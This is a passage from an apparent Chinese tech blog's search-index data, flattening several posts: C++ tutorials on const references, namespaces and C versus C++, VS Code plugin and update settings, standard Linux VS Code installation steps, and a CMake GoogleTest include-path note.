是错误写法，这里不能通过引用改变a的值，无法通过编译 // 只能用指针来改变引用的值 int * p = (int*) &amp;b; *p = 11; printf("a:%d\\n", a); printf("b:%d\\n", b); printf("&amp;a:%d\\n", &amp;a); printf("&amp;b:%d\\n", &amp;b); return 0;} 程序运行的输出结果如下： 1234a:11b:11&amp;a:1323872140&amp;b:1323872140 1234567891011121314151617181920212223242526#include &lt;iostream&gt;using namespace std;struct Teacher { char name[64]; int age;};// const引用让变量(所指内存空间)拥有只读属性void printTe(const Teacher &amp;t) { // t.age = 11; 是错误写法，无法通过编译}// const 修饰指针和指针指向的内容，那么指针指向的内容都不能更改void printTe2(const Teacher *const pt) { // pt-&gt;age = 11; 是错误写法，无法通过编译}int main() { Teacher t1; t1.age = 33; printTe(t1); printTe2(&amp;t1); return 0;} 使用字面量常量初始化 const 引用1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { const int b = 10; printf("b:%d\\n", &amp;b); // int &amp;a = 19; 若不加const关键字，则编译失败 const int &amp;a = 19; printf("&amp;a:%d \\n", &amp;a); return 0;} const 引用综合使用示例12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;int main() { // 普通引用 int a = 10; int &amp;b = a; // 常量引用，让变量拥有只读属性 const int &amp;c = a; // 常量引用的初始化分为以下两种 // 1.用变量初始化常量引用 { int x = 20; const int &amp;y = x; printf("y:%d \\n", y); } // 2.用字面量常量初始化常量引用 { // int &amp;m = 10; // 错误写法，引用是内存空间的别名，字面量10没有内存空间，没有方法做引用 const int &amp;m = 10; } return 0;} const 引用总结 普通引用 int &amp;e = a; 相当于 int * const e = &amp;a; 常引用 const int &amp; e; 相当于 const int * const e; 当使用字面量常量对 const 引用进行初始化时（如 const int &amp;m = 10;），C++ 编译器会为常量值单独分配内存空间，并将引用名作为这段内存空间的别名 使用字面量常量对 const 引用初始化后（如 const int &amp;m = 10;），将生成一个只读变量，但可以使用指针的方式更改变量的值，示例代码如下： 1234567891011#include &lt;iostream&gt;using namespace std;int main() { const int &amp;a = 100; int *p = (int *) &amp;a; *p = 30; cout &lt;&lt; *p &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;} 程序运行的输出结果如下： 123030 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 入门基础之一",url:"/posts/8bbc3f09.html",text:'大纲 C++ 入门基础之一、C++ 入门基础之二、C++ 入门基础之三 C++ 入门基础之四、C++ 入门基础之五、C++ 入门基础之六 C++ 入门基础之七、C++ 入门基础之八、C++ 入门基础之九 C++ 简介简介： C++ 被认为是一种中级语言，它综合了高级语言和低级语言的特点。 C++ 是 C 的一个超集，事实上，任何合法的 C 程序都是合法的 C++ 程序。 C++ 是一种静态类型的、编译式的、通用的、大小写敏感的、不规则的编程语言，支持过程化编程、面向对象编程和泛型编程。 C++ 是由 Bjarne Stroustrup 于 1979 年在新泽西州美利山贝尔实验室开始设计开发的。C++ 进一步扩充和完善了 C 语言，最初命名为带类的 C，后来在 1983 年更名为 C++。 注意：使用静态类型的编程语言是在编译时执行类型检查，而不是在运行时执行类型检查。 ANSI 标准： ANSI 标准是为了确保 C++ 的便携性 —— 您所编写的代码在 Mac、UNIX、Windows、Alpha 计算机上都能通过编译。由于 ANSI 标准已稳定使用了很长的时间，所有主要的 C++ 编译器的制造商都支持 ANSI 标准。 标准 C++ 的三大组成部分： 核心语言，提供了所有构件块，包括变量、数据类型和常量等。 C++ 标准库，提供了大量的函数，用于操作文件、字符串等。 标准模板库（STL），提供了大量的方法，用于操作数据结构等。 第一个 C++ 程序12345678910111213// 包含C++的头文件#include &lt;iostream&gt;// 使用命名空间 std（标准的命名空间），在这个命名空间中定义了很多 C++ 的标准定义using namespace std;int main() { // cout: 标准输出 // endl: 换行符号，类似 "\\n" // &lt;&lt; 左移操作符: 在C++里面，属于功能的改造（增强），即 C++ 语言的操作符重载 cout &lt;&lt; "hello world" &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 1hello world 关于 endl 与 \\n 的区别： 在 C++ 中，终端输出换行时，用 cout &lt;&lt; ... &lt;&lt; endl 与 \\n 都可以，但二者有小小的区别，用 endl 时会刷新缓冲区，使得栈中的东西刷新一次；但用 \\n 则不会刷新，它只会换行，栈内的数据没有变化。一般情况，二者的这点区别是很小的，在大型的程序中可能会用到，建议用 endl 来换行。 endl 除了写入 \\n 之外，还会调用 flush 函数来刷新缓冲区，将缓冲区里的数据写入文件或屏幕，若考虑效率则可以直接使用 \\n cout &lt;&lt; endl; 等价于 cout &lt;&lt; \'\\n\' &lt;&lt; flush; 程序设计方法介绍面向过程的程序设计方法设计思路 面向过程的结构化程序设计方法，自顶向下、逐步求精。采用模块分解与功能抽象，自顶向下、分而治之。 程序结构 按功能划分为若干个基本模块，形成一个树状结构。 各模块间的关系尽可能简单，功能上相对独立；每一模块内部均是由顺序、选择和循环三种基本结构组成。 其模块化实现的具体方法是使用子程序。 优缺点 优点: 有效地将一个较复杂的程序系统设计任务分解成许多易于控制和处理的子任务，便于开发和维护。 缺点: 可重用性差、数据安全性差、难以开发大型软件和图形界面的应用软件 把数据和处理数据的过程分离为相互独立的实体。 当数据结构改变时，所有相关的处理过程都要进行相应的修改。 每一种相对于老问题的新方法都要带来额外的开销。 图形用户界面的应用程序，很难用过程来描述和实现，开发和维护也都很困难。 面向对象的程序设计方法C++ 完全支持面向对象的程序设计，包括面向对象开发的四大特性： 封装、抽象、继承、多态，更多特性如下： 将数据及对数据的操作方法封装在一起，作为一个相互依存、不可分离的整体（对象）。 对同类型对象抽象出其共性，形成类。 类通过一个简单的外部接口，与外界发生关系。 对象与对象之间通过消息进行通信。 面向对象的软件工程概述面向对象的软件工程是面向对象方法在软件工程领域的全面应用，分别包括: 面向对象的分析（OOA） 面向对象的设计（OOD） 面向对象的编程（OOP） 面向对象的测试（OOT） 面向对象的软件维护（OOSM） 面向过程程序设计：数据结构 + 算法，主要用于解决科学计算问题，用户需求简单而固定，其特点和劣势如下： 特点： 分析解决问题所需要的步骤 利用函数实现各个步骤 依次调用函数解决问题 劣势： 软件可重用性差 软件可维护性差 构建的软件无法满足用户需求 面向对象程序设计：由现实世界建立软件模型，将现实世界中的事物直接映射到程序中，可直接满足用户需求，其特点和优势如下： 特点： 直接分析用户需求中涉及的各个实体 在代码中描述现实世界中的实体 在代码中关联各个实体协同工作解决问题 优势： 构建的软件能够适应用户需求的不断变化 直接利用面向过程方法的优势而避开其劣势 计算圆形的面积面向过程的写法1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { double r = 0; // 圆形的半径 double s = 0; // 圆形的面积 cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; s = 3.14 * r * r; cout &lt;&lt; "圆形的面积是：" &lt;&lt; s &lt;&lt; endl; return 0;} 面向对象的写法123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;using namespace std;class Circle {public: double m_r; // 圆形的半径 double m_s; // 圆形的面积public: void setR(double r) { m_r = r; } double getR() { return m_r; } double getS() { m_s = 3.14 * m_r * m_r; return m_s; }};int main() { double r; cout &lt;&lt; "请输入圆形的半径："; cin &gt;&gt; r; Circle circle; circle.setR(r); cout &lt;&lt; "圆形的面积是：" &lt;&lt; circle.getS() &lt;&lt; endl; return 0;} C++ 基础概念命名空间所谓 namespace，是指标识符的各种可见范围。C++ 标准程序库中的所有标识符都被定义于一个名为 std 的 namespace 中。&lt;iostream&gt; 和 &lt;iostream.h&gt; 格式是不一样的，前者没有后缀，实际上在编译器 include 文件夹里面可以看到，二者是两个文件，打开文件就会发现，里面的代码是不一样的。后缀为 .h 的头文件 C++ 标准已经明确提出不再支持了，早些的实现将标准库功能定义在全局命名空间里，即声明在带 .h 后缀的头文件里；C++ 标准为了和 C 区别开，也为了正确使用命名空间，规定头文件不再使用后缀 .h。 &lt;iostream.h&gt; 与 &lt;iostream&gt; 的区别： 当使用 &lt;iostream.h&gt; 时，相当于在 C 中调用库函数，使用的是全局命名空间，也就是早期的 C++ 实现 当使用 &lt;iostream&gt; 的时候，该头文件没有定义在全局命名空间，必须使用 using namespace std; 这样才能正确使用 cout 等关键字 由于 namespace 的概念，使用 C++ 标准程序库的任何标识符时，可以有以下三种写法可选择： 直接指定标识符：例如 std::ostream 而不是 ostream，完整语句为： std::cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; std::endl; 使用 using 关键字：using std::cout; using std::endl; using std::cin;，以上语句可以写成 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; 使用 using namespace std：这种写法是最方便的，例如： using namespace std;，以上语句可以写成 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl; 命名空间 std 内定义的所有标识符都有效（曝光），就好像它们被声明为全局变量一样，那么以上语句就可以这样写 cout &lt;&lt; hex &lt;&lt; 3.4 &lt;&lt; endl;。因为标准库非常的庞大，所以程序员在选择的类的名称或函数名时就很有可能和标准库中的某个名字相同。因此为了避免这种情况所造成的名字冲突，就把标准库中的一切都被放在名字空间 std 中。但这又会带来了一个新问题，无数原有的 C++ 代码都依赖于使用了多年的伪标准库中的功能，它们都是在全局命名空间下的。所以就有了 &lt;iostream.h&gt; 和 &lt;iostream&gt; 等等这样的头文件，一个是为了兼容以前的 C++ 代码，另一个是为了支持新的标准。命名空间 std 封装的是标准程序库的名称，标准程序库为了和以前的头文件区别，一般不加后缀 .h。 命名空间定义及使用语法在 C++ 中，名称（name）可以是符号常量、变量、宏、函数、结构、枚举、类和对象等等。为了避免在大规模程序的设计中，以及在程序员使用各种各样的 C++ 库时，这些标识符的命名发生冲突，标准 C++ 引入了关键字 namespace（命名空间 / 名字空间 / 名称空间 / 名域），这样就可以更好地控制标识符的作用域。std 是 C++ 标准命名空间，C++ 标准程序库中的所有标识符都被定义在 std 中，比如标准库中的类 iostream、vector 等都定义在该命名空间中，使用时要加上 using 声明（如 using namespace std) 或者 using 指示（如 std::string、std::vector&lt;int&gt;）。 C 语言中的命名空间： 标识符之间可能发生冲突 在 C 语言中只有一个全局作用域 C 语言中所有的全局标识符共享同一个作用域 C++ 中的命名空间： 命名空间可以相互嵌套定义 全局作用域也叫默认命名空间 命名空间将全局作用域分成不同的部分 不同命名空间中的标识符可以同名而不会发生冲突 C++ 命名空间定义及使用语法： 命名空间定义的语法：namespace name { … } 命名空间使用的语法：using namespace name; 使用特定命名空间中的变量：using name::variable; 使用默认命名空间中的变量：::variable 默认情况下可以直接使用默认命名空间中的所有标识符 命名空间编程实战1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;using namespace std;// 定义命名空间 NameSpaceAnamespace NameSpaceA { int a = 0;}// 定义命名空间 NameSpaceBnamespace NameSpaceB { int a = 1; // 嵌套定义命名空间 NameSpaceC namespace NameSpaceC { struct Teacher { char name[10]; int age; }; }}int main() { // 声明 std 命名空间后的写法 cout &lt;&lt; "hello world" &lt;&lt; endl; // 不声明 std 命名空间后的写法 std::cout &lt;&lt; "hello world" &lt;&lt; std::endl; // 声明 NameSpaceA 命名空间 using namespace NameSpaceA; // 使用 NameSpaceC 命名空间中的变量 using NameSpaceB::NameSpaceC::Teacher; printf("a = %d\\n", a); printf("a = %d\\n", NameSpaceB::a); Teacher teacher = {"Jim", 20}; printf("teacher.age = %d\\n", teacher.age); printf("teacher.name = %s\\n", teacher.name); return 0;} 程序运行的输出结果如下： 123456hello worldhello worlda = 0a = 1teacher.age = 20teacher.name = Jim C 语言和 C++ 的关系C 语言是在实践的过程中逐步完善起来的，没有深思熟虑的设计过程，使用时存在很多 灰色地带，残留了过多低级语言的特征，直接利用指针进行内存操作，其最终目标是程序执行效率的高效。当面向过程方法论暴露越来越多的缺陷的时候，业界开始考虑在工程项目中引入面向对象的设计方法，而第一个需要解决的问题就是：高效的面向对象语言，并且能够兼容已经存在的代码。C 语言和 C++ 语言的关系如下： C 语言和 C++ 并不是对立的竞争关系 C++ 是 C 语言的加强，是一种更好的 C 语言 C++ 是以 C 语言为基础的，并且完全兼容 C 语言的特性 C 语言 + 面向对象方法论 —&gt; C++ / Objective C C++ 对 C 语言的增强实用性增强C 语言中的变量都必须在作用域开始的位置定义，而 C++ 中更强调语言的 实用性，所有的变量都可以在需要使用时再定义。 1234567int main(int argc, char *argv[]){ int a = 0; printf("hello world\\n"); int b = 13; // C语言编译器中编译报错，但是C++编译器中不会报错 return 0;} 变量检测增强在 C 语言中，重复定义多个同名的全局变量是合法的，但在 C++ 中，不允许定义多个同名的全局变量。C 语言中多个同名的全局变量最终会被链接到全局数据区的同一个地址空间上。 12int g_var;int g_var = 1; // C++直接拒绝这种二义性的做法 struct 类型的增强C 语言的 struct 定义了一组变量的集合，C 编译器并不认为这是一种新的类型，而在 C++ 中的 struct 是一个新类型的定义声明。 123456789101112struct Student{ char name[100]; int age;};int main(int argc, char *argv[]){ Student s1 = {"wang", 1}; // C语言编译器编译报错，C++编译器编译通过 struct Student s2 = {"chen", 1}; // C语言编译器编译通过 return 0;} register 关键字增强register 是运行速度最快的关键字，其作用是请求编译器尽可能地将变量存在 CPU 内部的寄存器中，而不是通过内存寻址访问，以提高程序运行效率。注意这里是尽可能，不是绝对。首先，register 变量必须是能被 CPU 所接受的类型，这通常意味着 register 变量必须是一个单个的值，并且长度应该小于或者等于整型的长度。不过，有些机器的寄存器也能存放浮点数。C 语言中，register 关键字表示 “请求”（不一定成功）让变量直接放进寄存器中，方便访问，但是在 C 语言中不能取 register 变量的地址。C++ 对 register 进行了增强，C++ 编译器会对频繁被调用的变量主动申请为 register，即使没有用 register 关键字声明，它也会这样做。值得一提的是，C++ 编译器当发现程序中需要对 register 变量取地址时，register 对变量的声明会变得无效。 123456int main(int argc, char *argv[]){ register int a = 0; printf("&amp;a = %x\\n", &amp;a); return 0;} 由于寄存器的数量有限，而且某些寄存器只能接收特定类型的数据（如指针和浮点数），因此真正起作用的 register 修饰符的数目和类型都依赖于实际运行程序的机器，而任何多余的 register 修饰符都将被编译器所忽略。在某些情况下，把变量保存在寄存器中反而会降低程序的运行速度，这因为被占用的寄存器不能再用于其它用途；或者变量被使用的次数不够多，不足以抵消装入和存储变量所带来的额外开销。早期的 C 编译器不会自动把变量保存在寄存器中，除非程序员命令它这样做，这时 register 修饰符是 C 语言的一种很有价值的补充。然而，随着编译程序设计技术的进步，在决定哪些变量应该被存到寄存器中时，现代的 C 编译器能比程序员做出更好的决定。实际上，许多编译器都会忽略 register 修饰符，尽管它完全合法，但它仅仅是暗示而不是命令。 作用域限定运算符作用域限定运算符，用于对当前作用域之外的同名变量进行访问，例如在下面的例子中，可以利用 :: 实现在局部变量 a 的作用域内对全局变量 a 的访问。 1234567891011121314#include &lt;iostream&gt;using namespace std;int a;int main() { float a; a = 3.14; ::a = 6; cout &lt;&lt; "local variable a = " &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; "global variable a = " &lt;&lt; ::a &lt;&lt; endl; return 0;} 程序运行的输出结果如下： 12local variable a = 3.14global variable a = 6 新增 Bool 类型关键字C++ 在 C 语言的基本类型系统之上增加了 bool 类型关键字，bool 可取的值只有 true 和 false。理论上 bool 变量只占用一个字节，如果多个 bool 变量定义在一起，可能会各占一个 bit（位），这取决于编译器的实现。true 代表真值，编译器内部用 1 来表示，false 代表非真值，编译器内部用 0 来表示。C++ 编译器会在赋值时将非 0 值转换为 true，0 值转换为 false。 1234567int main(int argc, char *argv[]){ int a; bool b = true; printf("b = %d, sizeof(b) = %d\\n", b, sizeof(b)); return 0;} 程序运行的输出结果如下： 1b = 1, sizeof(b) = 1 三目运算符功能增强12345678910int main(int argc, char *argv[]) int a = 10; int b = 20; // 返回一个最小数，并且给最小数赋值成30 // C 语言中三目运算符是一个表达式 ，表达式不可以做左值，而 C++ 则可以 (a &lt; b ? a : b) = 30; printf("a = %d, b = %d\\n", a, b); return 0;} 程序运行的结果如下： 1a = 30, b = 20 使用三目运算符时，C 语言返回变量的值，C++ 是返回变量本身 C 语言中的三目运算符返回的是变量值，不能作为左值使用 C++ 中的三目运算符可直接返回变量本身，因此可以出现在程序的任何地方 特别注意：C++ 中三目运算符可能返回的值中如果有一个是常量值，则不能作为左值使用，例如 (a &lt; b ? 1 : b )= 30; C 语言如何支持类似 C++ 的三目运算特性呢？当左值的条件：要有内存空间，而 C++ 编译器只是帮助程序员取了一个地址而已，C 语言版的写法为：*(a &lt; b ? &amp;a : &amp;b) = 30 所有的变量和函数都必须声明类型 C 语言默认数据类型在 C++ 编译器中是不合法的，C++ 中所有变量和函数必须声明类型。以下代码在 C 语言中能编译通过，但在 C++ 中会编译报错。 1234567891011121314151617f(i){ printf("i = %d\\n", i);}g(){ return 5;}int main(int argc, char *argv[]){ f(10); printf("g() = %d\\n", g(1, 2, 3, 4, 5)); getchar(); return 0;} 在 C 语言中，int f() 表示返回值为 int，接受任意参数的函数 在 C 语言中，int f(void) 表示返回值为 int 的无参函数 在 C++ 中，int f() 和 int f(void) 具有相同的意义，都表示返回值为 int 的无参函数 C++ 更加强调类型，任意的程序元素都必须显示指明类型 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"VsCode 入门教程之二打造 Markdown 编辑器",url:"/posts/3baa0a8d.html",text:'常用插件文件图标主题 Material Icon Theme，一款非常漂亮的文件图标主题 自动隐藏侧边栏 Auto Hide，支持自动隐藏侧边栏 Markdown 插件Markdown 预览 Markdown Preview Mermaid Support，实时预览 Mermaid 绘图 Markdown Preview Enhanced，支持 Markdown 实时预览等各种强大的功能 Markdown 快捷键 Markdown Shortcuts，支持各种 Markdown 快捷键 Markdown 表格插入 MarkDown Table Format，支持使用快捷键全局格式化 Markdown 表格 Markdown Table，快速插入 Markdown 表格，支持表格自动格式化和自动插入行 Markdown 文档导出 Markdown PDF，Markdown 文档转 PDF 文档 Markdown 语法高亮 Mermaid Markdown Syntax Highlighting，支持 Mermaid 绘图的语法高亮 Markdown 图片粘贴 Markdown QiNiu，支持将粘贴板里的图片上传到七牛图床 Markdown Paste，支持将粘贴板里的图片保存到本地，并将图片的链接自动加入到 Markdown 文档中 Markdown 功能大全 Markdown All in One，提供了许多有用的功能，使得在 VS Code 中编写 Markdown 文档变得更加容易和高效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"VsCode 入门教程之一基础使用",url:"/posts/879c28df.html",text:'常用插件文件图标主题 vscode-icons Material Icon Theme 自动隐藏侧边栏 Auto Hide 自动更新关闭 VsCode 自动更新方法一： 打开菜单 File 中 Preferences 子菜单中选择 Settings 项，搜索 update mode，将其设置为 none，如下图所示： 方法二： 打开 查看（View）菜单，选择 命令面板（Command Palette） 菜单项或者使用（Ctrl + Shift + P）快捷键打开命令面板。 在命令面板中，输入 Preferences: Open Settings (JSON)，打开用户配置 JSON 的编辑界面，添加配置内容 "update.mode": "none"。 关闭 VsCode 自动更新插件方法一： 打开菜单 File 中 Preferences 子菜单中选择 Settings 项，搜索 Extensions: Auto Update，取消复选框的选中状态，如下图所示： 方法二： 打开 查看（View）菜单，选择 命令面板（Command Palette） 菜单项或者使用（Ctrl + Shift + P）快捷键打开命令面板。 在命令面板中，输入 Preferences: Open Settings (JSON)，打开用户配置 JSON 编辑界面，添加配置内容 "extensions.autoUpdate": false。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"Linux 安装 VS Code",url:"/posts/d8f0998b.html",text:'前言本文适用于 Debian/Ubuntu、RHEL/Fedora/CentOS、openSUSE/SLE-based、Arch 等 Linux 发行版。 VS Code 安装Debian / Ubuntu 安装软件仓库源和密钥 1234$ wget -qO- https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor &gt; packages.microsoft.gpg$ sudo install -o root -g root -m 644 packages.microsoft.gpg /etc/apt/trusted.gpg.d/$ sudo sh -c \'echo "deb [arch=amd64,arm64,armhf signed-by=/etc/apt/trusted.gpg.d/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main" &gt; /etc/apt/sources.list.d/vscode.list\'$ rm -f packages.microsoft.gpg 更新安装包缓存，并安装 VS Code 123$ sudo apt install apt-transport-https$ sudo apt update$ sudo apt install code RHEL/Fedora/CentOS 安装软件仓库源和密钥 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/yum.repos.d/vscode.repo\' 更新安装包缓存，并使用 dnf（Fedora 22 及更高版本） 安装 VS Code 12$ sudo dnf check-update$ sudo dnf install code 或者在旧版本的 CentOS 上使用 yum 安装 VS Code 12$ sudo yum check-update$ sudo yum install code 若 VS Code 成功安装后，在系统的应用菜单栏里找不到快捷启动方式，那么可以通过按下 Alt + F2 快捷键，然后输入 r 重启系统界面；然后导航到应用菜单栏：应用程序 –&gt; 编程 –&gt; Visual Studio Code，双击快捷启动方式的图标即可启动 VS Code。 openSUSE/SLE-based 安装软件仓库源和密钥 12$ sudo rpm --import https://packages.microsoft.com/keys/microsoft.asc$ sudo sh -c \'echo -e "[code]\\nname=Visual Studio Code\\nbaseurl=https://packages.microsoft.com/yumrepos/vscode\\nenabled=1\\ntype=rpm-md\\ngpgcheck=1\\ngpgkey=https://packages.microsoft.com/keys/microsoft.asc" &gt; /etc/zypp/repos.d/vscode.repo\' 更新安装包缓存，并安装 VS Code 12$ sudo zypper refresh$ sudo zypper install code ArchVS Code 有一个社区维护的 Arch 用户存储库包，要从 AUR 获取有关安装的更多信息，请参阅以下 WiKi 条目： 安装 AUR 包。 Snap通过 Snap 安装 VS Code，此安装方式适用于 RHEL 系、Debian 系、 openSUSE 系等大多数主流的 Linux 发行版，Snap 的安装和使用可参考 本站教程。VS Code 成功安装后，Snap 的守护进程将负责在后台自动更新 VS Code，每当有新的更新可用时，都会自动下载并安装最新版本的 VS Code。 12345$ sudo snap install --classic code或者$ sudo snap install --classic code-insiders VS Code 设置字体 下载字体 12$ cd /usr/share/fonts/truetype/$ git clone https://github.com/abertsch/Menlo-for-Powerline.git 刷新字体 1$ fc-cache -f -v 设置字体 或者编辑 VS Code 的 setting.json 配置文件，在其中加入以下配置内容： 1"editor.fontFamily": "\'Menlo for Powerline\'" 重启 VS Code，让字体更改生效 VS Code 版本更新VS Code 每月发布一次，可以通过查看发行日志了解何时有新版本可用。如果 VS Code 软件仓库源安装正确，那么 VS Code 应该会与系统上的其他软件包以相同的方式自动更新。值得一提的是，由于受限于手动签名过程和官方用于发布的系统，yum repo 可能会滞后并且无法立即获取到最新版本的 VS Code。 参考资料 Linux 安装 VS Code 官方教程 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux 开发工具"},{title:"C++ 开发随笔",url:"/posts/4ca3ab6c.html",text:'构建工具CMake 无法引入第三方库的头文件这里以 GoogleTest 库为例子，讲述 CMake 为什么无法正常引入项目里的第三方库的头文件，其中 GoogleTest 库在项目里的目录结构如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869minder├── CMakeLists.txt├── include├── src└── thirdparty └── googletest ├── gmock │ ├── include │ │ └── gmock │ │ ├── gmock-actions.h │ │ ├── gmock-cardinalities.h │ │ ├── gmock-function-mocker.h │ │ ├── gmock-generated-actions.h │ │ ├── gmock-generated-actions.h.pump │ │ ├── gmock-generated-function-mockers.h │ │ ├── gmock-generated-function-mockers.h.pump │ │ ├── gmock-generated-matchers.h │ │ ├── gmock-generated-matchers.h.pump │ │ ├── gmock.h │ │ ├── gmock-matchers.h │ │ ├── gmock-more-actions.h │ │ ├── gmock-more-matchers.h │ │ ├── gmock-nice-strict.h │ │ ├── gmock-spec-builders.h │ │ └── internal │ │ ├── custom │ │ │ ├── gmock-generated-actions.h │ │ │ ├── gmock-generated-actions.h.pump │ │ │ ├── gmock-matchers.h │ │ │ ├── gmock-port.h │ │ │ └── README.md │ │ ├── gmock-internal-utils.h │ │ ├── gmock-port.h │ │ └── gmock-pp.h │ └── lib │ ├── libgmock_main.so │ └── libgmock.so └── gtest ├── include │ └── gtest │ ├── gtest-death-test.h │ ├── gtest.h │ ├── gtest-matchers.h │ ├── gtest-message.h │ ├── gtest-param-test.h │ ├── gtest_pred_impl.h │ ├── gtest-printers.h │ ├── gtest_prod.h │ ├── gtest-spi.h │ ├── gtest-test-part.h │ ├── gtest-typed-test.h │ └── internal │ ├── custom │ │ ├── gtest.h │ │ ├── gtest-port.h │ │ ├── gtest-printers.h │ │ └── README.md │ ├── gtest-death-test-internal.h │ ├── gtest-filepath.h │ ├── gtest-internal.h │ ├── gtest-param-util.h │ ├── gtest-port-arch.h │ ├── gtest-port.h │ ├── gtest-string.h │ ├── gtest-type-util.h │ └── gtest-type-util.h.pump └── lib ├── libgtest_main.so └── libgtest.so 特别注意 在上面的项目结构中，gtest 的头文件所在的目录是 thirdparty/googletest/gtest/include/gtest/，而不是 thirdparty/googletest/gtest/include/。因此在 C++ 源文件中引入 gtest 头文件的正确写法是 #include &lt;gtest/gtest.h&gt;，即头文件的路径是 include 目录下的 gtest/gtest.h。这一点必须注意，否则会经常导致 CMake 无法正常引入第三方库的头文件。简单一句话概况，如果在 C++ 源文件中，头文件的引入方式是 #include &lt;gtest/gtest.h&gt;，那么在项目里的第三方库的 include 目录下必然要有一个 gtest 子目录。 C++ 的示例代码 1234567891011121314#include &lt;iostream&gt;#include &lt;gtest/gtest.h&gt;using namespace std;TEST( COutputPopLimitStrategyTest, PositiveNos ){ EXPECT_EQ(true, true);}int main(int argc, char **argv) { testing::InitGoogleTest(&amp;argc, argv); return RUN_ALL_TESTS();} CMake 的示例配置 123456789101112131415# 定义 GoogleTest 库的目录路径set(PATH_TO_GOOGLE_TEST thirdparty/googletest/gtest)set(PATH_TO_GOOGLE_MOCK thirdparty/googletest/gmock)# 引入 GoogleTest 库的头文件include_directories(${PATH_TO_GOOGLE_TEST}/include ${PATH_TO_GOOGLE_MOCK}/include)# 指定 GoogleTest 动态链接库所在的目录link_directories(${PATH_TO_GOOGLE_TEST}/lib ${PATH_TO_GOOGLE_MOCK}/lib)# 指定编译参数set(CMAKE_CXX_FLAGS "-lpthread")# 链接 GoogleTest 的动态链接库target_link_libraries(${PROJECT_NAME} gtest_main.so gtest.so gmock_main.so gmock.so) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": 